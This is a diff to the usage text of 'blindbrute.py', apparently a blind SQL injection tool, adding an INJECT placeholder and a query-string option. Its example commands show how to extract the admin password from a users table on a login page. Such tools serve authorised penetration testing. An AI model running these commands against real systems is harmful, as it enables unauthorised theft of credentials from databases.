@@ -45,10 +45,11 @@ pip install -r requirements.txt
     Optional Arguments:
         -ih, --injectable-headers    Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com)
         -sh, --static-headers        Static headers as key-value pairs that do not contain payloads
-        -d, --data                   Specify data to be sent in the request body. Changes request type to POST.
+        -d, --data                   Specify data to be sent in the request body. Changes request type to POST. INJECT placeholder will be replaced with the payload.
         -f, --file                   File containing the HTTP request with 'INJECT' placeholder for payloads
         -m, --max-length             Maximum length of the extracted data that the script will check for (default: 1000)
         -o, --output-file            Specify a file to output the extracted data
+        -qs, --query-string          Query string to append to the URL for GET requests. INJECT placeholder will be replaced with the payload.
         -ba, --binary-attack         Use binary search for ASCII extraction. HIGHLY recommended if character case matters.
         -da, --dictionary-attack     Path to a wordlist for dictionary-based extraction
         -db, --database              Specify the database type (e.g., MySQL, PostgreSQL)
@@ -64,7 +65,7 @@ pip install -r requirements.txt
     
 
     Examples:
-        blindbrute.py -u "http://example.com/login" -d "username=sam&password=" -t users -c password -w "username='admin'"
+        blindbrute.py -u "http://example.com/login" -d "username=sam&password=samspasswordINJECT" -t users -c password -w "username='admin'"
         blindbrute.py -u "http://example.com/login" -ih Cookie "SESSION=abc123" -t users -c password -w "username='admin'"
         blindbrute.py -u "http://example.com/login" -f request.txt -t users -c password -w "username='admin'" --binary-attack
         blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" --force status
